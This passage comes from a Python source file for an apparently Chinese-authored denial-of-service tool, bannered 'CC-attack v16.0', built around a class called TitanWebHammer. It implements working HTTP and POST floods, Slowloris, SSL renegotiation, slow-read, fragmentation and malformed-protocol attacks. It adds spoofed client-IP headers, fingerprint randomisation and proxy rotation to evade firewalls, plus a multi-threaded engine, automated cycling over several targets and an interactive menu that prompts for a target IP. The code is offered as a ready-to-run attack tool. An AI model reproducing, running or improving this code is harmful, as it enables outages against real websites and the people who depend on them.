                        if not self.auto_cycle_running:
                            break
                    self.stop_attack()
                    time.sleep(2)

                # 切换目标和循环
                self.auto_cycle_config["target_index"] = (self.auto_cycle_config["target_index"] + 1) % len(self.auto_cycle_targets)
                if self.auto_cycle_config["target_index"] == 0:
                    self.auto_cycle_config["current_cycle"] += 1

                # 切换等待
                if self.auto_cycle_running and self.auto_cycle_config["current_cycle"] < self.auto_cycle_config["total_cycles"]:
                    print(f"\n⏳ 准备切换到下一个目标，等待5秒...")
                    for i in range(5, 0, -1):
                        if not self.auto_cycle_running:
                            break
                        print(f"\r⏰ {i}秒后切换...", end="", flush=True)
                        time.sleep(1)
                    print("\r" + " " * 20 + "\r", end="", flush=True)
            except Exception as e:
                print(f"❌ 自动化循环错误: {str(e)}")
                time.sleep(5)
                continue
        self.auto_cycle_running = False
        print("\n✅ 自动化循环攻击完成!")

    def _start_single_attack(self, target, threads, attack_type, duration, bypass_firewall, search_engine=False, proxy_rotation=False):
        try:
            self.running = True
            self.current_target = f"{target['ip']}:{target['port']}"
            self.firewall_bypass_mode = bypass_firewall
            self.search_engine_mode = search_engine
            self.proxy_rotation_mode = proxy_rotation
            self.proxy_index = 0
            self.stats = {
                "requests": 0, "success": 0, "failed": 0,
                "start_time": datetime.now(), "last_rps": 0,
                "peak_rps": 0, "last_update": time.time()
            }
            self.attack_threads = []
            threading.Thread(target=self._enhanced_monitor, daemon=True).start()
            if duration:
                threading.Timer(duration, self.stop_attack).start()
            thread_count = min(threads, self.CONFIG['max_threads'])

            # 攻击工作线程
            def attack_worker(worker_id):
                request_count = 0
                while self.running:
                    try:
                        if proxy_rotation:
                            current_attack = self._proxy_rotation_attack
                        elif search_engine:
                            current_attack = self._search_engine_attack
                        elif attack_type == "mixed":
                            current_attack = random.choice([
                                self._http_flood, self._slow_loris, self._ssl_reneg,
                                self._websocket, self._post_flood, self._random_method, self._http2_flood
                            ])
                        elif attack_type == "bypass_firewall":
                            current_attack = self._bypass_firewall_attack
                        else:
                            current_attack = getattr(self, f"_{attack_type}", self._http_flood)
                        result = current_attack(target)
                        with self.lock:
                            self.stats["requests"] += 1
                            if result:
                                self.stats["success"] += 1
                            else:
                                self.stats["failed"] += 1

                        # 自适应休眠
                        request_count += 1
                        if request_count % 10 == 0:
                            success_rate = self.stats["success"] / self.stats["requests"] if self.stats["requests"] > 0 else 0
                            if success_rate < 0.3:
                                time.sleep(random.uniform(0.01, 0.1))
                            else:
                                time.sleep(random.uniform(0.001, 0.05))
                        else:
                            time.sleep(random.uniform(0.005, 0.05))
                    except Exception as e:
                        with self.lock:
                            self.stats["failed"] += 1
                        continue

            # 批量启动线程
            batch_size = min(50, thread_count // 10)
            for i in range(0, thread_count, batch_size):
                if not self.running:
                    break
                batch_threads = min(batch_size, thread_count - i)
                for j in range(batch_threads):
                    t = threading.Thread(target=attack_worker, args=(i+j,), daemon=True)
                    t.start()
                    self.attack_threads.append(t)
                    time.sleep(0.001)
            return True
        except Exception as e:
            print(f"❌ 单次攻击启动失败: {str(e)}")
            self.running = False
            return False

    def stop_auto_cycle_attack(self):
        if not self.auto_cycle_running:
            print("ℹ️ 没有正在运行的自动化循环攻击")
            return

        self.auto_cycle_running = False
        self.stop_attack()
        print("\n🛑 正在停止自动化循环攻击...")
        if self.auto_cycle_thread and self.auto_cycle_thread.is_alive():
            self.auto_cycle_thread.join(timeout=5)
        time.sleep(1)
        print("✅ 自动化循环攻击已停止")

    def _parse_ip_target(self, ip, port, use_ssl=False):
        try:
            socket.inet_aton(ip)
        except socket.error:
            print(f"❌ 无效的IP地址: {ip}")
            return None
        if not (1 <= port <= 65535):
            print(f"❌ 端口号必须在1-65535之间: {port}")
            return None
        return {
            "ip": ip, "host": ip, "port": port,
            "path": "/", "ssl": use_ssl
        }

    def _create_stealth_socket(self, target):
        try:
            # 代理逻辑
            if self.use_proxy and not self.proxy_rotation_mode:
                proxy = self.get_next_proxy()
                if proxy:
                    s = self._create_proxy_socket(target, proxy)
                    if s:
                        return s
                    print("⚠️ 代理连接失败，使用直连")
            # JA3逻辑
            if self.use_ja3 and target['ssl'] and JA3_AVAILABLE:
                return self._ja3_http_attack(target)

            # 直连Socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.CONFIG["timeout"])
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, random.randint(8192, 65536))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, random.randint(8192, 65536))
            s.connect((target['ip'], target['port']))

            if target['ssl']:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_COMPRESSION
                if random.random() > 0.5:
                    context.set_ciphers('DEFAULT:@SECLEVEL=1')
                s = context.wrap_socket(s, server_hostname=target['host'])

            return s
        except Exception as e:
            return None

    def _create_proxy_socket(self, target, proxy):
        try:
            parsed_proxy = urlparse(proxy)
            proxy_host = parsed_proxy.hostname
            proxy_port = parsed_proxy.port or (443 if parsed_proxy.scheme == 'https' else 80)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.CONFIG["timeout"])
            s.connect((proxy_host, proxy_port))

            if target['ssl']:
                connect_str = f"CONNECT {target['ip']}:{target['port']} HTTP/1.1\r\nHost: {target['ip']}:{target['port']}\r\n\r\n"
                s.send(connect_str.encode())
                response = b""
                while b"\r\n\r\n" not in response:
                    response += s.recv(4096)
                if b"200" not in response:
                    s.close()
                    return None

                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target['ip'])

            return s
        except Exception as e:
            return None

    def _generate_bypass_headers(self, target, method):
        if self.search_engine_mode:
            return self._generate_search_engine_headers(target, method)

        # 生成绕过防火墙的请求头
        browser_fingerprint = random.choice(self.BROWSER_FINGERPRINTS)
        headers = [
            f"{method} {target['path']} HTTP/1.1",
            f"Host: {target['host']}:{target['port']}",
            f"User-Agent: {browser_fingerprint['user_agent']}",
            f"Accept: {browser_fingerprint['accept']}",
            f"Accept-Language: {browser_fingerprint['accept_language']}",
            f"Accept-Encoding: {browser_fingerprint['accept_encoding']}"
        ]

        # 随机添加头部
        if random.random() > 0.3:
            headers.append(f"Cache-Control: {random.choice(['no-cache', 'max-age=0', 'no-store'])}")
        if random.random() > 0.4:
            headers.append(f"Upgrade-Insecure-Requests: 1")
        if random.random() > 0.5:
            headers.append(f"DNT: {random.randint(0, 1)}")
        if random.random() > 0.6:
            headers.append(f"Sec-Fetch-Dest: {random.choice(['document', 'empty', 'script'])}")
        if random.random() > 0.6:
            headers.append(f"Sec-Fetch-Mode: {random.choice(['navigate', 'cors', 'no-cors'])}")
        if random.random() > 0.6:
            headers.append(f"Sec-Fetch-Site: {random.choice(['same-origin', 'cross-site'])}")

        # 随机IP头部
        ip_headers = [
            f"X-Forwarded-For: {self._generate_realistic_ip()}",
            f"X-Real-IP: {self._generate_realistic_ip()}",
            f"X-Client-IP: {self._generate_realistic_ip()}",
            f"X-Originating-IP: {self._generate_realistic_ip()}",
            f"X-Remote-IP: {self._generate_realistic_ip()}",
            f"X-Remote-Addr: {self._generate_realistic_ip()}",
            f"Forwarded: for={self._generate_realistic_ip()};proto={'https' if target['ssl'] else 'http'}",
            f"CF-Connecting-IP: {self._generate_realistic_ip()}",
            f"True-Client-IP: {self._generate_realistic_ip()}"
        ]
        selected_ips = random.sample(ip_headers, random.randint(2, 4))
        headers.extend(selected_ips)

        # Referer逻辑
        if random.random() > 0.2:
            referer = random.choice(self.REFERERS)
            if "{host}" in referer:
                referer = referer.replace("{host}", target['host'])
            headers.append(f"Referer: {referer}")

        headers.append(f"Connection: {random.choice(['keep-alive', 'close'])}")
        headers.append("\r\n")
        return [h for h in headers if h]

    def _generate_realistic_ip(self):
        # 生成真实IP
        ip_ranges = [(1, 126), (128, 191), (192, 223), (224, 239), (240, 254)]
        range_weights = [0.25, 0.35, 0.35, 0.03, 0.02]
        ip_range = random.choices(ip_ranges, weights=range_weights)[0]
        first_octet = random.randint(ip_range[0], ip_range[1])

        # 排除特殊IP段
        while first_octet in [0, 10, 127, 169, 172, 192, 198, 203, 224, 240]:
            first_octet = random.randint(1, 254)
        return f"{first_octet}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def _bypass_firewall_attack(self, target):
        # 防火墙绕过
        for retry in range(self.CONFIG["max_retry"]):
            try:
                attack_method = random.choices(
                    [self._stealth_http_flood, self._slow_read, self._fragment_attack, self._protocol_anomaly],
                    weights=[0.4, 0.2, 0.2, 0.2],
                    k=1
                )[0]
                return attack_method(target)
            except Exception as e:
                if retry == self.CONFIG["max_retry"] - 1:
                    return False
                time.sleep(0.1 * (2 ** retry))
        return False

    # ================= 基础攻击方法 =================
    def _http_flood(self, target):
        if self.use_http2 and target['ssl'] and HTTP2_AVAILABLE:
            return self._http2_flood(target)
        if self.use_ja3 and target['ssl'] and JA3_AVAILABLE:
            return self._ja3_http_attack(target)
        if self.firewall_bypass_mode:
            return self._bypass_firewall_attack(target)

        for retry in range(self.CONFIG["max_retry"]):
            try:
                method = random.choices(["GET", "POST", "HEAD"], weights=[5, 3, 2], k=1)[0]
                headers = self._generate_bypass_headers(target, method)
                request = "\r\n".join(headers)
                s = self._create_stealth_socket(target)
                if not s:
                    continue

                s.send(request.encode())
                try:
                    s.recv(512)
                except:
                    pass
                s.close()
                return True
            except Exception as e:
                if retry == self.CONFIG["max_retry"] - 1:
                    return False
                time.sleep(0.1 * (2 ** retry))
        return False

    def _slow_loris(self, target):
        try:
            s = self._create_stealth_socket(target)
            if not s:
                return False
            headers = self._generate_bypass_headers(target, "POST")
            partial_headers = headers[:-2]
            for i, header in enumerate(partial_headers):
                if not self.running:
                    break
                s.send(f"{header}\r\n".encode())
                delay = random.uniform(8, 25) if i < len(partial_headers) - 1 else 30
                time.sleep(delay)
            s.close()
            return True
        except:
            return False

    def _ssl_reneg(self, target):
        if not target['ssl']:
            return self._http_flood(target)

        for retry in range(self.CONFIG["max_retry"]):
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = self._create_stealth_socket(target)
                if not s:
                    continue
                ssl_sock = context.wrap_socket(s, server_hostname=target['host'])

                reneg_count = random.randint(3, 8)
                for i in range(reneg_count):
                    if not self.running:
                        break
                    try:
                        ssl_sock.do_handshake()
                        time.sleep(0.1)
                    except:
                        pass
                    time.sleep(random.uniform(0.3, 1.5))

                ssl_sock.close()
                return True
            except:
                if retry == self.CONFIG["max_retry"] - 1:
                    return False
                time.sleep(0.2 * (2 ** retry))
        return False

    def _websocket(self, target):
        for retry in range(self.CONFIG["max_retry"]):
            try:
                s = self._create_stealth_socket(target)
                if not s:
                    continue
                ws_key = base64.b64encode(os.urandom(16)).decode()
                ws_headers = [
                    f"GET {target['path']} HTTP/1.1",
                    f"Host: {target['host']}:{target['port']}",
                    f"Upgrade: websocket",
                    f"Connection: Upgrade",
                    f"Sec-WebSocket-Key: {ws_key}",
                    f"Sec-WebSocket-Version: 13",
                    f"User-Agent: {random.choice(self.USER_AGENTS)}",
                    f"Origin: {random.choice(['http://', 'https://'])}{target['host']}:{target['port']}",
                    "\r\n"
                ]
                request = "\r\n".join(ws_headers)
                s.send(request.encode())
                time.sleep(random.uniform(3, 10))
                s.close()
                return True
            except:
                if retry == self.CONFIG["max_retry"] - 1:
                    return False
                time.sleep(0.1 * (2 ** retry))
        return False

    def _post_flood(self, target):
        for retry in range(self.CONFIG["max_retry"]):
            try:
                data_size = random.randint(2048, 20480)
                post_data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=data_size))
                headers = self._generate_bypass_headers(target, "POST")
                headers = [h for h in headers if not h.startswith('Content-')]
                headers.insert(3, f"Content-Type: application/x-www-form-urlencoded")
                headers.insert(4, f"Content-Length: {len(post_data)}")
                request = "\r\n".join(headers) + post_data
                s = self._create_stealth_socket(target)
                if not s:
                    continue

                s.send(request.encode())
                try:
                    s.recv(512)
                except:
                    pass
                s.close()
                return True
            except:
                if retry == self.CONFIG["max_retry"] - 1:
                    return False
                time.sleep(0.1 * (2 ** retry))
        return False

    def _random_method(self, target):
        for retry in range(self.CONFIG["max_retry"]):
            try:
                methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
                method = random.choices(methods, weights=[10, 8, 3, 2, 2, 2, 5, 1, 1], k=1)[0]
                headers = self._generate_bypass_headers(target, method)
                request = "\r\n".join(headers)
                s = self._create_stealth_socket(target)
                if not s:
                    continue

                s.send(request.encode())
                try:
                    s.recv(512)
                except:
                    pass
                s.close()
                return True
            except:
                if retry == self.CONFIG["max_retry"] - 1:
                    return False
                time.sleep(0.1 * (2 ** retry))
        return False

    # ================= 增强控制系统 =================
    def start_attack(self, ip, port, use_ssl=False, threads=1000, attack_type="mixed", duration=None, bypass_firewall=False, use_proxy=False, search_engine=False, proxy_rotation=False, use_ja3=False, use_http2=False):
        if self.running or self.async_running:
            print("🛑 攻击正在进行中，请先停止")
            return False
        try:
            target = self._parse_ip_target(ip, port, use_ssl)
            if not target:
                raise ValueError("无效目标")
            self.running = True
            self.current_target = f"{ip}:{port}"
            self.firewall_bypass_mode = bypass_firewall
            self.use_proxy = use_proxy
            self.search_engine_mode = search_engine
            self.proxy_rotation_mode = proxy_rotation
            self.use_ja3 = use_ja3
            self.use_http2 = use_http2 and HTTP2_AVAILABLE and use_ssl
            self.proxy_index = 0
            self.stats = {
                "requests": 0, "success": 0, "failed": 0,
                "start_time": datetime.now(), "last_rps": 0,
                "peak_rps": 0, "last_update": time.time()
            }
            self.attack_threads = []

            # 模式名称处理
            mode_name = self.CONFIG['attack_types'][attack_type]['name']
            if bypass_firewall:
                mode_name += " [防火墙绕过模式]"
            if search_engine:
                mode_name = "搜索引擎模拟"
            if proxy_rotation:
                mode_name = "代理轮换攻击"
            if use_ja3:
                mode_name = "JA3指纹随机化"
            if use_http2:
                mode_name = "HTTP/2洪水"

            # 打印启动信息
            print(f"\n⚡ 启动增强攻击 [{ip}:{port}]")
            print(f"🔒 协议: {'HTTPS' if use_ssl else 'HTTP'}")
            print(f"🛡️ 线程数: {threads} | 模式: {mode_name}")
            print(f"🔌 使用代理: {'是' if use_proxy else '否'} ({len(self.proxies)}个代理)")
            print(f"🔄 代理轮换: {'是' if proxy_rotation else '否'}")
            print(f"🔍 搜索引擎模拟: {'是' if search_engine else '否'}")
            print(f"🔐 JA3指纹随机化: {'是' if use_ja3 else '否'}")
            print(f"🌐 HTTP/2多路复用: {'是' if use_http2 else '否'}")
            if duration:
                print(f"⏰ 持续时间: {duration}秒")
            print("="*50)

            # 保存会话
            session_key = f"{ip}_{port}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            self.sessions[session_key] = {
                "target": f"{ip}:{port}", "protocol": "HTTPS" if use_ssl else "HTTP",
                "threads": threads, "attack_type": attack_type,
                "bypass_firewall": bypass_firewall, "use_proxy": use_proxy,
                "proxy_rotation": proxy_rotation, "search_engine": search_engine,
                "use_ja3": use_ja3, "use_http2": use_http2,
                "start_time": datetime.now().isoformat()
            }
            self.save_sessions()

            # 启动监控和攻击
            threading.Thread(target=self._enhanced_monitor, daemon=True).start()
            if duration:
                threading.Timer(duration, self.stop_attack).start()
            thread_count = min(threads, self.CONFIG['max_threads'])

            # 攻击工作线程
            def attack_worker(worker_id):
                request_count = 0
                while self.running:
                    try:
                        if proxy_rotation:
                            current_attack = self._proxy_rotation_attack
                        elif search_engine:
                            current_attack = self._search_engine_attack
                        elif attack_type == "mixed":
                            current_attack = random.choice([
                                self._http_flood, self._slow_loris, self._ssl_reneg,
                                self._websocket, self._post_flood, self._random_method, self._http2_flood
                            ])
                        elif attack_type == "bypass_firewall":
                            current_attack = self._bypass_firewall_attack
                        else:
                            current_attack = getattr(self, f"_{attack_type}", self._http_flood)
                        result = current_attack(target)
                        with self.lock:
                            self.stats["requests"] += 1
                            if result:
                                self.stats["success"] += 1
                            else:
                                self.stats["failed"] += 1

                        # 自适应休眠
                        request_count += 1
                        if request_count % 10 == 0:
                            success_rate = self.stats["success"] / self.stats["requests"] if self.stats["requests"] > 0 else 0
                            if success_rate < 0.3:
                                time.sleep(random.uniform(0.01, 0.1))
                            else:
                                time.sleep(random.uniform(0.001, 0.05))
                        else:
                            time.sleep(random.uniform(0.005, 0.05))
                    except Exception as e:
                        with self.lock:
                            self.stats["failed"] += 1
                        continue

            # 批量启动线程
            batch_size = min(50, thread_count // 10)
            for i in range(0, thread_count, batch_size):
                if not self.running:
                    break
                batch_threads = min(batch_size, thread_count - i)
                for j in range(batch_threads):
                    t = threading.Thread(target=attack_worker, args=(i+j,), daemon=True)
                    t.start()
                    self.attack_threads.append(t)
                    time.sleep(0.001)
            return True
        except Exception as e:
            print(f"❌ 启动失败: {str(e)}")
            import traceback
            traceback.print_exc()
            self.running = False
            return False

    def stop_attack(self):
        if not self.running:
            print("ℹ️ 没有正在运行的攻击")
            return

        self.running = False
        self.firewall_bypass_mode = False
        self.use_proxy = False
        self.search_engine_mode = False
        self.proxy_rotation_mode = False
        self.use_ja3 = False
        self.use_http2 = False
        print("\n🛑 正在停止攻击...")

        # 保存会话
        for key, session in self.sessions.items():
            if session.get("end_time") is None and self.current_target in session.get("target", ""):
                session["end_time"] = datetime.now().isoformat()
                start_time = datetime.fromisoformat(session["start_time"])
                session["duration"] = (datetime.now() - start_time).total_seconds()
        self.save_sessions()

        time.sleep(1)
        print("✅ 攻击已停止")

    def _enhanced_monitor(self):
        last_requests = 0
        last_time = time.time()
        while self.running:
            try:
                current_time = time.time()
                elapsed = current_time - self.stats["start_time"].timestamp()
                current_requests = self.stats["requests"]

                # 计算RPS
                time_diff = current_time - last_time
                if time_diff >= 1.0:
                    current_rps = (current_requests - last_requests) / time_diff
                    self.stats["last_rps"] = current_rps
                    self.stats["last_update"] = current_time
                    if current_rps > self.stats["peak_rps"]:
                        self.stats["peak_rps"] = current_rps
                    last_requests = current_requests
                    last_time = current_time

                # 打印监控信息
                success_rate = (self.stats["success"] / current_requests * 100) if current_requests > 0 else 0
                status_color = "🟢" if success_rate > 70 else "🟡" if success_rate > 30 else "🔴"
                bypass_indicator = "🛡️" if self.firewall_bypass_mode else "⚡"
                proxy_indicator = "🔌" if self.use_proxy else "🔗"
                rotation_indicator = "🔄" if self.proxy_rotation_mode else ""
                search_indicator = "🔍" if self.search_engine_mode else ""
                ja3_indicator = "🔐" if self.use_ja3 else ""
                http2_indicator = "🌐" if self.use_http2 else ""
                cycle_info = f" | 🔄 循环: {self.auto_cycle_config['current_cycle']+1}/{self.auto_cycle_config['total_cycles']}" if self.auto_cycle_running else ""

                print(
                    f"\r{http2_indicator}{ja3_indicator}{rotation_indicator}{search_indicator}{proxy_indicator}{bypass_indicator}{status_color} 请求: {current_requests} | "
                    f"成功: {self.stats['success']} ({success_rate:.1f}%) | "
                    f"实时RPS: {self.stats['last_rps']:.1f}/s | "
                    f"峰值RPS: {self.stats['peak_rps']:.1f}/s | "
                    f"运行: {int(elapsed)}s{cycle_info}", 
                    end="", flush=True
                )
                time.sleep(0.5)
            except Exception as e:
                time.sleep(1)

    def show_sessions(self):
        """显示历史会话"""
        if not self.sessions:
            print("📝 无历史会话记录")
            return
            
        print(f"\n📋 历史攻击会话 ({len(self.sessions)} 条):")
        print("="*80)
        for i, (key, session) in enumerate(list(self.sessions.items())[-10:], 1):
            target = session.get("target", "N/A")
            protocol = session.get("protocol", "HTTP")
            threads = session.get("threads", "N/A")
            attack_type = session.get("attack_type", "N/A")
            bypass = "是" if session.get("bypass_firewall") else "否"
            proxy = "是" if session.get("use_proxy") else "否"
            rotation = "是" if session.get("proxy_rotation") else "否"
            search_engine = "是" if session.get("search_engine") else "否"
            ja3 = "是" if session.get("use_ja3") else "否"
            http2 = "是" if session.get("use_http2") else "否"
            async_mode = "是" if session.get("async_mode") else "否"
            start_time = session.get("start_time", "N/A")
            duration = session.get("duration", "进行中")
            
            print(f"{i}. 目标: {target} ({protocol})")
            mode_info = f"模式: {attack_type}"
            if async_mode == "是":
                mode_info += " [异步]"
            print(f"   {mode_info} | 绕过防火墙: {bypass} | 使用代理: {proxy} | 代理轮换: {rotation}")
            print(f"   搜索引擎: {search_engine} | JA3: {ja3} | HTTP/2: {http2} | 线程: {threads}")
            print(f"   开始: {start_time} | 时长: {duration}秒")
            print()

    def clear_sessions(self):
        """清除所有会话记录"""
        self.sessions = {}
        self.save_sessions()
        print("✅ 所有历史记录已清除")

    def show_proxies(self):
        """显示代理列表"""
        if not self.proxies:
            print("📝 无代理记录")
            return
            
        print(f"\n🔌 代理列表 ({len(self.proxies)} 个):")
        print("="*50)
        for i, proxy in enumerate(self.proxies[:20], 1):
            print(f"{i}. {proxy}")
        if len(self.proxies) > 20:
            print(f"... 还有 {len(self.proxies) - 20} 个代理未显示")

    def show_status(self):
        """显示当前状态"""
        status_text = ""
        
        if self.async_running:
            elapsed = (datetime.now() - self.stats["start_time"]).total_seconds()
            success_rate = (self.stats["success"] / self.stats["requests"] * 100) if self.stats["requests"] > 0 else 0
            
            status_text += f"""
🚀 异步攻击状态:
   🔄 总请求: {self.stats['requests']}
   ✅ 成功: {self.stats['success']} ({success_rate:.1f}%)
   ❌ 失败: {self.stats['failed']}
   🚀 实时RPS: {self.stats['last_rps']:.1f}/s
   📈 峰值RPS: {self.stats['peak_rps']:.1f}/s
   ⏱️ 运行时间: {int(elapsed)}秒
   🎯 目标: {self.current_target}
   🌐 引擎: asyncio + aiohttp
   💡 模式: 异步高并发
"""
        
        if self.auto_cycle_running:
            status_text += f"""
🔄 自动化循环状态:
   🎯 目标数量: {len(self.auto_cycle_targets)}
   🔄 当前循环: {self.auto_cycle_config['current_cycle'] + 1}/{self.auto_cycle_config['total_cycles']}
   ⏱️ 每轮时长: {self.auto_cycle_config['cycle_duration']}秒
   🛡️ 防火墙绕过: {'是' if self.firewall_bypass_mode else '否'}
   🔌 使用代理: {'是' if self.use_proxy else '否'} ({len(self.proxies)}个代理)
   🔄 代理轮换: {'是' if self.proxy_rotation_mode else '否'}
   🔍 搜索引擎模拟: {'是' if self.search_engine_mode else '否'}
   🔐 JA3指纹随机化: {'是' if self.use_ja3 else '否'}
   🌐 HTTP/2多路复用: {'是' if self.use_http2 else '否'}
"""
        
        if self.running:
            elapsed = (datetime.now() - self.stats["start_time"]).total_seconds()
            success_rate = (self.stats["success"] / self.stats["requests"] * 100) if self.stats["requests"] > 0 else 0
            
            status_text += f"""
📊 当前攻击状态:
   🔄 总请求: {self.stats['requests']}
   ✅ 成功: {self.stats['success']} ({success_rate:.1f}%)
   ❌ 失败: {self.stats['failed']}
   🚀 实时RPS: {self.stats['last_rps']:.1f}/s
   📈 峰值RPS: {self.stats['peak_rps']:.1f}/s
   ⏱️ 运行时间: {int(elapsed)}秒
   🎯 目标: {self.current_target}
   🛡️ 防火墙绕过: {'是' if self.firewall_bypass_mode else '否'}
   🔌 使用代理: {'是' if self.use_proxy else '否'} ({len(self.proxies)}个代理)
   🔄 代理轮换: {'是' if self.proxy_rotation_mode else '否'}
   🔍 搜索引擎模拟: {'是' if self.search_engine_mode else '否'}
   🔐 JA3指纹随机化: {'是' if self.use_ja3 else '否'}
   🌐 HTTP/2多路复用: {'是' if self.use_http2 else '否'}
   💡 成功模式: {len(self.success_patterns)} 条记录
"""
        
        if not status_text:
            status_text = "ℹ️ 当前没有运行中的攻击"
            
        return status_text

    # ================= 辅助攻击方法 =================
    def _stealth_http_flood(self, target):
        """隐蔽HTTP洪水"""
        return self._http_flood(target)

    def _slow_read(self, target):
        """慢速读取攻击"""
        try:
            s = self._create_stealth_socket(target)
            if not s:
                return False
            
            headers = self._generate_bypass_headers(target, "GET")
            request = "\r\n".join(headers)
            s.send(request.encode())
            
            # 慢速读取响应
            total_read = 0
            while total_read < 8192 and self.running:
                try:
                    chunk = s.recv(1)
                    if not chunk:
                        break
                    total_read += len(chunk)
                    time.sleep(random.uniform(0.5, 2))
                except:
                    break
                    
            s.close()
            return True
        except:
            return False

    def _fragment_attack(self, target):
        """分片攻击"""
        try:
            s = self._create_stealth_socket(target)
            if not s:
                return False
            
            headers = self._generate_bypass_headers(target, "GET")
            
            # 分片发送请求
            for i, header in enumerate(headers):
                if not self.running:
                    break
                s.send(f"{header}\r\n".encode())
                if i < len(headers) - 1:
                    time.sleep(random.uniform(0.1, 0.5))
                    
            s.close()
            return True
        except:
            return False

    def _protocol_anomaly(self, target):
        """协议异常攻击"""
        try:
            s = self._create_stealth_socket(target)
            if not s:
                return False
            
            # 发送异常协议数据
            anomalies = [
                "GET / HTTP/0.9\r\n\r\n",
                "GET / HTTP/3.0\r\n\r\n",
                "GET / \r\n\r\n",
                "GET / HTTP/1.1\r\nHost: {host}\r\n" * 100 + "\r\n",
                "GET / HTTP/1.1\r\nX-Long-Header: " + "A" * 10000 + "\r\n\r\n"
            ]
            
            anomaly = random.choice(anomalies)
            if "{host}" in anomaly:
                anomaly = anomaly.replace("{host}", target['host'])
                
            s.send(anomaly.encode())
            time.sleep(1)
            s.close()
            return True
        except:
            return False


def clear_screen():
    """清屏函数"""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    """显示增强版横幅（大字母改为CC-attack）"""
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║    ██████╗ ██████╗       ██████╗  █████╗  ██████╗  █████╗    ║
    ║    ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗██╔════╝ ██╔══██╗   ║
    ║    ██████╔╝██████╔╝█████╗██████╔╝███████║██║  ███╗███████║   ║
    ║    ██╔══██╗██╔══██╗╚════╝██╔══██╗██╔══██║██║   ██║██╔══██║   ║
    ║    ██║  ██║██████╔╝      ██║  ██║██║  ██║╚██████╔╝██║  ██║   ║
    ║    ╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ║
    ║                                                              ║
    ║                                (CC-attack v16.0 作者巴尔克)  ║
    ║ 支持IP输入 | 代理轮换 | 搜索引擎模拟 | JA3指纹 | HTTP/2      ║
    ║             异步高并发 | 20,000线程 | 1M RPS                 ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def main():
    clear_screen()
    show_banner()
    tool = TitanWebHammer()

    while True:
        print("\n🎯 [主菜单]")
        print("1. 🚀 启动单目标攻击")
        print("2. 🛡️  启动防火墙绕过攻击") 
        print("3. 🔍 启动搜索引擎模拟攻击")
        print("4. 🔄 启动代理轮换攻击")
        print("5. 🔐 启动JA3指纹随机化攻击")
        print("6. 🌐 启动HTTP/2洪水攻击")
        print("7. ⚡ 启动异步高并发攻击")
        print("8. 🔁 启动自动化循环攻击")
        print("9. 🛑 停止当前攻击")
        print("10. ⏹️  停止异步攻击")
        print("11. ⏹️  停止自动化循环")
        print("12. 📊 查看状态")
        print("13. 📋 历史会话")
        print("14. 🔌 代理管理")
        print("15. 🗑️  清除记录")
        print("0. ❌ 退出系统")

        choice = input("\n请选择操作: ").strip()

        if choice == "1":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            
            use_ja3 = False
            use_http2 = False
            if use_ssl:
                use_ja3 = input("🔐 启用JA3指纹随机化? (y/N): ").strip().lower() == 'y'
                if use_ja3 and not JA3_AVAILABLE:
                    print("⚠️ JA3不可用，请安装: pip install tls-client")
                    use_ja3 = False
                
                use_http2 = input("🌐 启用HTTP/2多路复用? (y/N): ").strip().lower() == 'y'
                if use_http2 and not HTTP2_AVAILABLE:
                    print("⚠️ HTTP/2不可用，请安装: pip install h2")
                    use_http2 = False
                
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为手动停止): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            use_proxy = input("🔌 使用代理? (y/N): ").strip().lower() == 'y'
            if use_proxy and not tool.proxies:
                print("⚠️ 代理列表为空，将使用直连")
                use_proxy = False

            proxy_rotation = input("🔄 启用代理轮换? (y/N): ").strip().lower() == 'y'

            print("\n🔧 攻击模式:")
            modes = list(tool.CONFIG['attack_types'].keys())
            for i, (k, v) in enumerate(tool.CONFIG['attack_types'].items(), 1):
                if k not in ["bypass_firewall", "auto_cycle", "search_engine", "proxy_rotation", "ja3_random", "async_http_flood", "async_http2_flood", "async_post_flood", "async_random_method"]:
                    print(f"   {i}. {v['name']} - {v['desc']}")
            
            try:
                mode_choice = input("🎲 选择模式(默认1): ").strip() or "1"
                mode_index = int(mode_choice) - 1
                if 0 <= mode_index < len(modes) - 9:
                    attack_type = modes[mode_index]
                else:
                    attack_type = "mixed"
            except:
                attack_type = "mixed"

